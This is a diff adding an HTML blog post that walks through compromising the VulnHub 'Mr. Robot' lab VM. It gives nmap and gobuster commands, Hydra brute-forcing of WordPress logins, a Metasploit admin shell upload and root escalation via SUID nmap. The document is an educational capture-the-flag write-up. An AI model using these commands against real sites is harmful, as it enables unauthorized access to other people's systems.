@@ -1,0 +1,226 @@
+<!DOCTYPE html><html><head>
+      <title>robot</title>
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width, initial-scale=1.0">
+      
+      <link rel="stylesheet" href="file:///c:\Users\Omen\.vscode\extensions\shd101wyy.markdown-preview-enhanced-0.8.20\crossnote\dependencies\katex\katex.min.css">
+      
+      
+      
+      
+      
+      <style>
+      code[class*=language-],pre[class*=language-]{color:#333;background:0 0;font-family:Consolas,"Liberation Mono",Menlo,Courier,monospace;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.4;-moz-tab-size:8;-o-tab-size:8;tab-size:8;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none}pre[class*=language-]{padding:.8em;overflow:auto;border-radius:3px;background:#f5f5f5}:not(pre)>code[class*=language-]{padding:.1em;border-radius:.3em;white-space:normal;background:#f5f5f5}.token.blockquote,.token.comment{color:#969896}.token.cdata{color:#183691}.token.doctype,.token.macro.property,.token.punctuation,.token.variable{color:#333}.token.builtin,.token.important,.token.keyword,.token.operator,.token.rule{color:#a71d5d}.token.attr-value,.token.regex,.token.string,.token.url{color:#183691}.token.atrule,.token.boolean,.token.code,.token.command,.token.constant,.token.entity,.token.number,.token.property,.token.symbol{color:#0086b3}.token.prolog,.token.selector,.token.tag{color:#63a35c}.token.attr-name,.token.class,.token.class-name,.token.function,.token.id,.token.namespace,.token.pseudo-class,.token.pseudo-element,.token.url-reference .token.variable{color:#795da3}.token.entity{cursor:help}.token.title,.token.title .token.punctuation{font-weight:700;color:#1d3e81}.token.list{color:#ed6a43}.token.inserted{background-color:#eaffea;color:#55a532}.token.deleted{background-color:#ffecec;color:#bd2c00}.token.bold{font-weight:700}.token.italic{font-style:italic}.language-json .token.property{color:#183691}.language-markup .token.tag .token.punctuation{color:#333}.language-css .token.function,code.language-css{color:#0086b3}.language-yaml .token.atrule{color:#63a35c}code.language-yaml{color:#183691}.language-ruby .token.function{color:#333}.language-markdown .token.url{color:#795da3}.language-makefile .token.symbol{color:#795da3}.language-makefile .token.variable{color:#183691}.language-makefile .token.builtin{color:#0086b3}.language-bash .token.keyword{color:#0086b3}pre[data-line]{position:relative;padding:1em 0 1em 3em}pre[data-line] .line-highlight-wrapper{position:absolute;top:0;left:0;background-color:transparent;display:block;width:100%}pre[data-line] .line-highlight{position:absolute;left:0;right:0;padding:inherit 0;margin-top:1em;background:hsla(24,20%,50%,.08);background:linear-gradient(to right,hsla(24,20%,50%,.1) 70%,hsla(24,20%,50%,0));pointer-events:none;line-height:inherit;white-space:pre}pre[data-line] .line-highlight:before,pre[data-line] .line-highlight[data-end]:after{content:attr(data-start);position:absolute;top:.4em;left:.6em;min-width:1em;padding:0 .5em;background-color:hsla(24,20%,50%,.4);color:#f4f1ef;font:bold 65%/1.5 sans-serif;text-align:center;vertical-align:.3em;border-radius:999px;text-shadow:none;box-shadow:0 1px #fff}pre[data-line] .line-highlight[data-end]:after{content:attr(data-end);top:auto;bottom:.4em}html body{font-family:'Helvetica Neue',Helvetica,'Segoe UI',Arial,freesans,sans-serif;font-size:16px;line-height:1.6;color:#333;background-color:#fff;overflow:initial;box-sizing:border-box;word-wrap:break-word}html body>:first-child{margin-top:0}html body h1,html body h2,html body h3,html body h4,html body h5,html body h6{line-height:1.2;margin-top:1em;margin-bottom:16px;color:#000}html body h1{font-size:2.25em;font-weight:300;padding-bottom:.3em}html body h2{font-size:1.75em;font-weight:400;padding-bottom:.3em}html body h3{font-size:1.5em;font-weight:500}html body h4{font-size:1.25em;font-weight:600}html body h5{font-size:1.1em;font-weight:600}html body h6{font-size:1em;font-weight:600}html body h1,html body h2,html body h3,html body h4,html body h5{font-weight:600}html body h5{font-size:1em}html body h6{color:#5c5c5c}html body strong{color:#000}html body del{color:#5c5c5c}html body a:not([href]){color:inherit;text-decoration:none}html body a{color:#08c;text-decoration:none}html body a:hover{color:#00a3f5;text-decoration:none}html body img{max-width:100%}html body>p{margin-top:0;margin-bottom:16px;word-wrap:break-word}html body>ol,html body>ul{margin-bottom:16px}html body ol,html body ul{padding-left:2em}html body ol.no-list,html body ul.no-list{padding:0;list-style-type:none}html body ol ol,html body ol ul,html body ul ol,html body ul ul{margin-top:0;margin-bottom:0}html body li{margin-bottom:0}html body li.task-list-item{list-style:none}html body li>p{margin-top:0;margin-bottom:0}html body .task-list-item-checkbox{margin:0 .2em .25em -1.8em;vertical-align:middle}html body .task-list-item-checkbox:hover{cursor:pointer}html body blockquote{margin:16px 0;font-size:inherit;padding:0 15px;color:#5c5c5c;background-color:#f0f0f0;border-left:4px solid #d6d6d6}html body blockquote>:first-child{margin-top:0}html body blockquote>:last-child{margin-bottom:0}html body hr{height:4px;margin:32px 0;background-color:#d6d6d6;border:0 none}html body table{margin:10px 0 15px 0;border-collapse:collapse;border-spacing:0;display:block;width:100%;overflow:auto;word-break:normal;word-break:keep-all}html body table th{font-weight:700;color:#000}html body table td,html body table th{border:1px solid #d6d6d6;padding:6px 13px}html body dl{padding:0}html body dl dt{padding:0;margin-top:16px;font-size:1em;font-style:italic;font-weight:700}html body dl dd{padding:0 16px;margin-bottom:16px}html body code{font-family:Menlo,Monaco,Consolas,'Courier New',monospace;font-size:.85em;color:#000;background-color:#f0f0f0;border-radius:3px;padding:.2em 0}html body code::after,html body code::before{letter-spacing:-.2em;content:'\00a0'}html body pre>code{padding:0;margin:0;word-break:normal;white-space:pre;background:0 0;border:0}html body .highlight{margin-bottom:16px}html body .highlight pre,html body pre{padding:1em;overflow:auto;line-height:1.45;border:#d6d6d6;border-radius:3px}html body .highlight pre{margin-bottom:0;word-break:normal}html body pre code,html body pre tt{display:inline;max-width:initial;padding:0;margin:0;overflow:initial;line-height:inherit;word-wrap:normal;background-color:transparent;border:0}html body pre code:after,html body pre code:before,html body pre tt:after,html body pre tt:before{content:normal}html body blockquote,html body dl,html body ol,html body p,html body pre,html body ul{margin-top:0;margin-bottom:16px}html body kbd{color:#000;border:1px solid #d6d6d6;border-bottom:2px solid #c7c7c7;padding:2px 4px;background-color:#f0f0f0;border-radius:3px}@media print{html body{background-color:#fff}html body h1,html body h2,html body h3,html body h4,html body h5,html body h6{color:#000;page-break-after:avoid}html body blockquote{color:#5c5c5c}html body pre{page-break-inside:avoid}html body table{display:table}html body img{display:block;max-width:100%;max-height:100%}html body code,html body pre{word-wrap:break-word;white-space:pre}}.markdown-preview{width:100%;height:100%;box-sizing:border-box}.markdown-preview ul{list-style:disc}.markdown-preview ul ul{list-style:circle}.markdown-preview ul ul ul{list-style:square}.markdown-preview ol{list-style:decimal}.markdown-preview ol ol,.markdown-preview ul ol{list-style-type:lower-roman}.markdown-preview ol ol ol,.markdown-preview ol ul ol,.markdown-preview ul ol ol,.markdown-preview ul ul ol{list-style-type:lower-alpha}.markdown-preview .newpage,.markdown-preview .pagebreak{page-break-before:always}.markdown-preview pre.line-numbers{position:relative;padding-left:3.8em;counter-reset:linenumber}.markdown-preview pre.line-numbers>code{position:relative}.markdown-preview pre.line-numbers .line-numbers-rows{position:absolute;pointer-events:none;top:1em;font-size:100%;left:0;width:3em;letter-spacing:-1px;border-right:1px solid #999;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none}.markdown-preview pre.line-numbers .line-numbers-rows>span{pointer-events:none;display:block;counter-increment:linenumber}.markdown-preview pre.line-numbers .line-numbers-rows>span:before{content:counter(linenumber);color:#999;display:block;padding-right:.8em;text-align:right}.markdown-preview .mathjax-exps .MathJax_Display{text-align:center!important}.markdown-preview:not([data-for=preview]) .code-chunk .code-chunk-btn-group{display:none}.markdown-preview:not([data-for=preview]) .code-chunk .status{display:none}.markdown-preview:not([data-for=preview]) .code-chunk .output-div{margin-bottom:16px}.markdown-preview .md-toc{padding:0}.markdown-preview .md-toc .md-toc-link-wrapper .md-toc-link{display:inline;padding:.25rem 0}.markdown-preview .md-toc .md-toc-link-wrapper .md-toc-link div,.markdown-preview .md-toc .md-toc-link-wrapper .md-toc-link p{display:inline}.markdown-preview .md-toc .md-toc-link-wrapper.highlighted .md-toc-link{font-weight:800}.scrollbar-style::-webkit-scrollbar{width:8px}.scrollbar-style::-webkit-scrollbar-track{border-radius:10px;background-color:transparent}.scrollbar-style::-webkit-scrollbar-thumb{border-radius:5px;background-color:rgba(150,150,150,.66);border:4px solid rgba(150,150,150,.66);background-clip:content-box}html body[for=html-export]:not([data-presentation-mode]){position:relative;width:100%;height:100%;top:0;left:0;margin:0;padding:0;overflow:auto}html body[for=html-export]:not([data-presentation-mode]) .markdown-preview{position:relative;top:0;min-height:100vh}@media screen and (min-width:914px){html body[for=html-export]:not([data-presentation-mode]) .markdown-preview{padding:2em calc(50% - 457px + 2em)}}@media screen and (max-width:914px){html body[for=html-export]:not([data-presentation-mode]) .markdown-preview{padding:2em}}@media screen and (max-width:450px){html body[for=html-export]:not([data-presentation-mode]) .markdown-preview{font-size:14px!important;padding:1em}}@media print{html body[for=html-export]:not([data-presentation-mode]) #sidebar-toc-btn{display:none}}html body[for=html-export]:not([data-presentation-mode]) #sidebar-toc-btn{position:fixed;bottom:8px;left:8px;font-size:28px;cursor:pointer;color:inherit;z-index:99;width:32px;text-align:center;opacity:.4}html body[for=html-export]:not([data-presentation-mode])[html-show-sidebar-toc] #sidebar-toc-btn{opacity:1}html body[for=html-export]:not([data-presentation-mode])[html-show-sidebar-toc] .md-sidebar-toc{position:fixed;top:0;left:0;width:300px;height:100%;padding:32px 0 48px 0;font-size:14px;box-shadow:0 0 4px rgba(150,150,150,.33);box-sizing:border-box;overflow:auto;background-color:inherit}html body[for=html-export]:not([data-presentation-mode])[html-show-sidebar-toc] .md-sidebar-toc::-webkit-scrollbar{width:8px}html body[for=html-export]:not([data-presentation-mode])[html-show-sidebar-toc] .md-sidebar-toc::-webkit-scrollbar-track{border-radius:10px;background-color:transparent}html body[for=html-export]:not([data-presentation-mode])[html-show-sidebar-toc] .md-sidebar-toc::-webkit-scrollbar-thumb{border-radius:5px;background-color:rgba(150,150,150,.66);border:4px solid rgba(150,150,150,.66);background-clip:content-box}html body[for=html-export]:not([data-presentation-mode])[html-show-sidebar-toc] .md-sidebar-toc a{text-decoration:none}html body[for=html-export]:not([data-presentation-mode])[html-show-sidebar-toc] .md-sidebar-toc .md-toc{padding:0 16px}html body[for=html-export]:not([data-presentation-mode])[html-show-sidebar-toc] .md-sidebar-toc .md-toc .md-toc-link-wrapper .md-toc-link{display:inline;padding:.25rem 0}html body[for=html-export]:not([data-presentation-mode])[html-show-sidebar-toc] .md-sidebar-toc .md-toc .md-toc-link-wrapper .md-toc-link div,html body[for=html-export]:not([data-presentation-mode])[html-show-sidebar-toc] .md-sidebar-toc .md-toc .md-toc-link-wrapper .md-toc-link p{display:inline}html body[for=html-export]:not([data-presentation-mode])[html-show-sidebar-toc] .md-sidebar-toc .md-toc .md-toc-link-wrapper.highlighted .md-toc-link{font-weight:800}html body[for=html-export]:not([data-presentation-mode])[html-show-sidebar-toc] .markdown-preview{left:300px;width:calc(100% - 300px);padding:2em calc(50% - 457px - 300px / 2);margin:0;box-sizing:border-box}@media screen and (max-width:1274px){html body[for=html-export]:not([data-presentation-mode])[html-show-sidebar-toc] .markdown-preview{padding:2em}}@media screen and (max-width:450px){html body[for=html-export]:not([data-presentation-mode])[html-show-sidebar-toc] .markdown-preview{width:100%}}html body[for=html-export]:not([data-presentation-mode]):not([html-show-sidebar-toc]) .markdown-preview{left:50%;transform:translateX(-50%)}html body[for=html-export]:not([data-presentation-mode]):not([html-show-sidebar-toc]) .md-sidebar-toc{display:none}
+/* Please visit the URL below for more information: */
+/*   https://shd101wyy.github.io/markdown-preview-enhanced/#/customize-css */
+
+      </style>
+      <!-- The content below will be included at the end of the <head> element. --><script type="text/javascript">
+  document.addEventListener("DOMContentLoaded", function () {
+    // your code here
+  });
+</script></head><body for="html-export">
+    
+    
+      <div class="crossnote markdown-preview  ">
+      
+<nav style="text-align:right; font-size:0.9rem; margin-bottom:20px;">
+  <a href="index.html"> Home</a> |
+  <a href="..\blog.html">Blog</a> |
+  <a href="..\contact.html">Contact</a> |
+  <a href="..\resume.html" target="_blank">Resume</a>
+</nav>
+<hr>
+<h1 id="mr-robot-walkthrough">Mr. Robot Walkthrough </h1>
+<p><em>Published on November 14, 2025 by <strong>Ewan Oleghe</strong>.</em></p>
+<hr>
+<h2 id="introduction">Introduction </h2>
+<p>Performed full compromise of <a href="https://www.vulnhub.com/entry/mr-robot-1,151/" target="_blank">VulnHub <strong>Mr. Robot</strong></a> with methodical, reproducible techniques and artifacted evidence. Produced reproducible attack walkthroughs, artifacts, SOC detection cases, hardening recommendations, and incident-response playbooks..</p>
+<hr>
+<h3 id="set-up">Set up. </h3>
+<p>Deployed Mr. Robot and Kali in my home lab on VirtualBox host-only networking to enable VM-to-VM communication while avoiding external exposure.</p>
+<h2 id="reconnaissance--enumeration">Reconnaissance / Enumeration </h2>
+<p><strong>Nmap Scan.</strong><br>
+With connectivity verified, Nmap was used for enumeration to identify open ports, services, and potential vulnerabilities on the Mr. Robot machine. Using targeted scanning options allowed for efficient information gathering without generating excessive network noise.</p>
+<ul>
+<li>Scan for open ports.</li>
+</ul>
+<pre data-role="codeBlock" data-info="bash" class="language-bash bash"><code><span class="token comment">### bash</span>
+<span class="token comment">### Nmap Scan</span>
+nmap <span class="token parameter variable">-T3</span> <span class="token parameter variable">-n</span> <span class="token parameter variable">-Pn</span> -p- <span class="token number">192.168</span>.78.103
+
+</code></pre><ul style="font-size:70%">
+  <li>-T3 : Timing template for moderate speed.</li>
+  <li>-n : Disables DNS resolution to reduce unnecessary traffic.</li>
+  <li>-Pn : Skips host discovery and treats the target as online.</li>
+  <li>-p- : Scans all 65,535 TCP ports, instead of a limited set.</li>
+</ul>
+<p><img src="image_r.png" alt="alt text"></p>
+<p>Three ports discovered 22, 80 and 443. Port 22 is closed.</p>
+<h1></h1>
+<ul>
+<li>Scan open ports for OS-detection, and vulnerability.</li>
+</ul>
+<pre data-role="codeBlock" data-info="bash" class="language-bash bash"><code><span class="token comment">### bash</span>
+<span class="token comment">### Service &amp; script scan</span>
+nmap <span class="token parameter variable">-sV</span> <span class="token parameter variable">-sC</span> <span class="token parameter variable">-T3</span> <span class="token parameter variable">-n</span> <span class="token parameter variable">-Pn</span> -p80,443 <span class="token number">192.168</span>.78.101
+
+</code></pre><ul style="font-size:70%">
+  <li>-sV: Version detection — identifies software/service versions.</li>
+  <li>-sC	Runs Nmap’s default safe scripts (same as --script=default).</li>
+  <li>-p22,80,443	Targets specific open ports found earlier.</li>
+</ul>
+<p><img src="image_r2.png" alt="alt text"></p>
+<p>The scan revealed <strong>two open TCP ports (80 and 443)</strong> on the target system, both running Apache-based web services. These exposed services serve as key footholds for deeper enumeration and potential exploitation pathways.</p>
+<h2 id="vulnerability-analysis">Vulnerability Analysis </h2>
+<p>The Nmap scan of the target identified a small but potentially exploitable attack surface consisting of two open web-related ports: 80 (HTTP) and 443 (HTTPS), both running Apache httpd. While no high-severity vulnerabilities were immediately disclosed during the default NSE script scan, several findings warrant further investigation:</p>
+<p><strong>Apache HTTP Server Exposure on Ports 80</strong><br>
+Further investigation of the HTTP service at port 80 revealed that the site is running WordPress. This was confirmed through fingerprinting using Wappalyzer, which identified WordPress-specific technologies and structure. The presence of WordPress significantly expands the potential attack surface, as it introduces common vectors such as outdated plugins, vulnerable themes, weak administrative credentials, and default configurations.</p>
+<h1></h1>
+<p><img src="image_r3.png" alt="alt text"></p>
+<p><strong>Directory Bruteforce.</strong><br>
+I used GoBuster to uncover hidden directories.</p>
+<pre data-role="codeBlock" data-info="bash" class="language-bash bash"><code><span class="token comment">### bash</span>
+<span class="token comment">### GoBuster Scan</span>
+gobuster <span class="token function">dir</span> <span class="token parameter variable">-u</span> http://192.168.78.103/ <span class="token parameter variable">-w</span> /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+</code></pre><p>Gobuster revealed 'wp-login.php' and 'wp-admin' pages, both pages redirecting to '/wp-login.php' and an attempt at login produces a 'username' error.</p>
+<p><img src="image_r4.png" alt="alt text"></p>
+<p><img src="image-5.png" alt="alt text"></p>
+<p><strong>robots.txt Enumeration Findings</strong><br>
+Further enumeration of the robots.txt file on the target web server revealed the following entries:</p>
+<pre data-role="codeBlock" data-info="bash" class="language-bash bash"><code>User-agent: *
+fsocity.dic
+key-1-of-3.txt
+</code></pre><p>The presence of fsocity.dic is significant, as the .dic extension indicates a dictionary file, which commonly contains a large list of words.</p>
+<p>The file key-1-of-3.txt also suggests the presence of intentionally placed artifacts.</p>
+<h1></h1>
+<h2 id="exploitation">Exploitation </h2>
+<p><strong>Download files to local machine and Examine these files</strong><br>
+The fsocity.dic file was successfully downloaded from the target server, and a line count analysis using the wc -l command confirmed that the dictionary file contains 858,160 entries.</p>
+<p><strong>Previewing the File Contents</strong><br>
+A quick inspection of the first few entries showed common words and duplicate identifiers. The file was sorted and duplicate lines were removed, producing a cleaned wordlist named nfsocity.dic. The resulting file contained 11,451 unique entries.</p>
+<pre data-role="codeBlock" data-info="bash" class="language-bash bash"><code><span class="token comment">### bash</span>
+<span class="token function">sort</span> fsocity.dic <span class="token operator">|</span> <span class="token function">uniq</span> <span class="token operator">&gt;</span> nfsocity.dic
+</code></pre><ul>
+<li>Assess whether the usernames listed in <strong>nfsocity.dic</strong> trigger an ‘Invalid username’ response during authentication attempts.</li>
+<li>Authentication requests were intercepted with Burp Suite to observe server responses and confirm whether error messages varied based on the username supplied. The captured request structure was then used in Hydra to perform an authorized test against the authentication endpoint using the nfsocity.dic wordlist to determine if the system exhibited username enumeration characteristics.</li>
+</ul>
+<p><img src="image_r6.png" alt="alt text"></p>
+<pre data-role="codeBlock" data-info="bash" class="language-bash bash"><code><span class="token comment">### bash</span>
+<span class="token comment">### Hydra Username Enumeration</span>
+hydra <span class="token parameter variable">-L</span> nfsocity.dic <span class="token parameter variable">-p</span> <span class="token builtin class-name">test</span> <span class="token number">192.168</span>.78.103 http-post-form <span class="token string">'/wp-login.php:log=^USER^&amp;pwd=^PASS^&amp;wp-submit=Log+In:F=Invalid username'</span> 
+</code></pre><ul style="font-size:70%">
+  <li>-L nfsocity.dic: Use this file as a list of usernames to test.</li>
+  <li>-p test: Use this fixed password 'test' for every username.</li>
+  <li>F=Invalid username: If the server responds with this phrase, the login attempt failed. </li>
+</ul>
+<p><img src="image_r7.png" alt="alt text"></p>
+<ul>
+<li>Hydra was configured to flag responses containing “Invalid username”, which allowed identification of elliot as a valid usernames.</li>
+</ul>
+<pre data-role="codeBlock" data-info="bash" class="language-bash bash"><code><span class="token comment">### bash</span>
+<span class="token comment">### Hydra Password Brute-Force</span>
+hydra <span class="token parameter variable">-l</span> elliot <span class="token parameter variable">-P</span> nfsocity.dic <span class="token number">192.168</span>.78.103 http-post-form <span class="token string">"/wp-login.php:log=^USER^&amp;pwd=^PASS^&amp;wp-submit=Log+In:F=Password is incorrect"</span>
+</code></pre><ul>
+<li>A password brute-force evaluation was conducted using Hydra with elliot as the fixed username and nfsocity.dic as the password list.</li>
+</ul>
+<p><img src="image_r8.png" alt="alt text"></p>
+<ul>
+<li>The password 'ER28-0652' was successfully identified for the elliot account, enabling access to the WordPress admin dashboard and our role is defined as an administrator.</li>
+<li>An additional subscriber account named ‘mich05654’ was identified.</li>
+</ul>
+<p><img src="image_r9.png" alt="alt text"></p>
+<p><strong>Gaining Initial Access via WordPress</strong><br>
+We can utilize the WordPress administrative access to establish a managed shell on the web server using Metasploit as part of the authorized assessment.</p>
+<pre data-role="codeBlock" data-info="bash" class="language-bash bash"><code><span class="token comment">### bash</span>
+<span class="token comment">### Metasploit WordPress Admin Shell</span>
+msfconsole
+
+msf <span class="token operator">&gt;</span> 
+use exploit/unix/webapp/wp_admin_shell_upload
+
+</code></pre><p><img src="image_10.png" alt="alt text"></p>
+<p><img src="image_11.png" alt="alt text"></p>
+<ul style="font-size:70%">
+  <li>set password ER28-0652</li>
+  <li>set rhosts 192.168.78.103</li>
+  <li>set username elliot</li>
+  <li>Show advanced options
+    <ul>
+        <li><strong>set WPCHECK false</strong></li>
+        <li>WPCHECK: Check if the website is a valid WordPress install</li>
+    </ul>
+  </li>
+</ul>
+<p>Using the WordPress-admin-derived shell, we accessed the /home/robot directory and retrieved the password.raw-md5 file, which contains the hashed password for the user robot; access to key-2-of-3.txt was denied due to insufficient permissions.</p>
+<p><img src="image_12.png" alt="alt text"></p>
+<ul>
+<li>The exploit was executed, resulting in a Meterpreter session on the target system.</li>
+</ul>
+<h1></h1>
+<p><img src="image_13.png" alt="alt text"></p>
+<ul>
+<li>Python TTY was employed to upgrade Simple Shells to Fully Interactive TTYs</li>
+</ul>
+<p><img src="image_14.png" alt="alt text"></p>
+<p><img src="image_15.png" alt="alt text"></p>
+<ul>
+<li>Exploration of the robot user’s home directory.</li>
+</ul>
+<hr>
+<h2 id="privilege-escalation">Privilege escalation </h2>
+<p>*<strong>Cracking 'password.raw-md5'</strong></p>
+<ul>
+<li>The password.raw-md5 file was downloaded to the local machine and cracked online at <a href="https://crackstation.net/">https://crackstation.net/</a> .<br>
+<img src="image_16.png" alt="alt text"></li>
+</ul>
+<p><strong>Privilege Escalation to root</strong></p>
+<ul>
+<li>Checked sudo permissions for robot user</li>
+</ul>
+<pre data-role="codeBlock" data-info="bash" class="language-bash bash"><code><span class="token comment">### bash</span>
+<span class="token function">sudo</span> <span class="token parameter variable">-l</span>
+</code></pre><ul>
+<li><em><strong>Find SUID files</strong></em></li>
+</ul>
+<pre data-role="codeBlock" data-info="bash" class="language-bash bash"><code><span class="token comment">### bash</span>
+<span class="token function">find</span> / <span class="token parameter variable">-perm</span> <span class="token parameter variable">-4000</span> <span class="token parameter variable">-type</span> f <span class="token operator"><span class="token file-descriptor important">2</span>&gt;</span>/dev/null
+</code></pre><p><img src="image_17.png" alt="alt text"></p><ul style="font-size:70%"><p></p>
+  <li>The command output revealed several SUID-enabled binaries, including /usr/local/bin/nmap, which was of particular interest.</li>
+  <li>This command
+        <ul>
+            <li>Searches the entire filesystem (/) for files with the SUID permission bit set (-perm -4000).</li>
+            <li>Redirects error messages (like "Permission denied") to /dev/null to keep the output clean (2&gt;/dev/null).</li>
+        </ul>
+   </li>
+</ul>
+<ul>
+<li>Start Nmap: Nmap has an interactive mode</li>
+</ul>
+<pre data-role="codeBlock" data-info="bash" class="language-bash bash"><code>    <span class="token comment">### bash</span>
+    nmap <span class="token parameter variable">--interactive</span>
+</code></pre><p><img src="image_18.png" alt="alt text"></p>
+<ul>
+<li>In interactive mode, we can execute shell commands by using the ! (exclamation mark) followed by the command.</li>
+</ul>
+<pre data-role="codeBlock" data-info="bash" class="language-bash bash"><code>    nmap<span class="token operator">&gt;</span> <span class="token operator">!</span> <span class="token function">whoami</span>
+    root
+
+    nmap<span class="token operator">&gt;</span> <span class="token operator">!</span> <span class="token function">ls</span> /root
+    key-3-of-3.txt
+
+    nmap<span class="token operator">&gt;</span> <span class="token operator">!</span> <span class="token function">cat</span> /root/key-3-of-3.txt
+</code></pre><p><img src="image_19.png" alt="alt text"></p>
+<p>All three keys have now been successfully identified, including the final one located in /root/key-3-of-3.txt. This confirms that full privilege escalation to the root account was achieved within the scope of the authorized challenge, completing the objectives of the exercise.</p>
+
+      </div>
+      
+      
+    
+    
+    
+    
+    
+    
+  
+    </body></html>
